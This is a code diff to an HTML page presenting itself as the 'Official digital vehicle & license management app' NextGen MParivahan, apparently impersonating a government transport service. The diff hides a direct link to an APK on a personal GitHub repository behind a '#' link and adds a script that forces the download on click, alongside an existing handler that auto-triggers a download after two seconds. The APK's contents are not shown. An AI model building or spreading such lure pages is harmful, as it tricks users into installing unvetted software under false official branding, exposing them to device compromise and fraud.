@@ -431,11 +431,8 @@
     </div>
     <h1>NextGen MParivahan</h1>
     <p class="sub">Official digital vehicle &amp; license management app</p>
-    <a href="https://github.com/deathraider8888-hash/Letscheck/releases/latest/download/mparivahan.apk"
-   class="btn"
-   id="download"
-   target="_self">
-   Install App
+    <a href="#" class="btn" id="download">
+    Install App
 </a>
   </header>
 
@@ -573,6 +570,19 @@ document.addEventListener("DOMContentLoaded", function () {
         link.click();
         document.body.removeChild(link);
     }, 2000);
+});
+</script>
+  <script>
+document.getElementById("download").addEventListener("click", function(e) {
+    e.preventDefault();
+
+    const link = document.createElement("a");
+    link.href = "https://github.com/deathraider8888-hash/Letscheck/releases/latest/download/mparivahan.apk";
+    link.download = "mparivahan.apk";
+
+    document.body.appendChild(link);
+    link.click();
+    document.body.removeChild(link);
 });
 </script>
 </body>
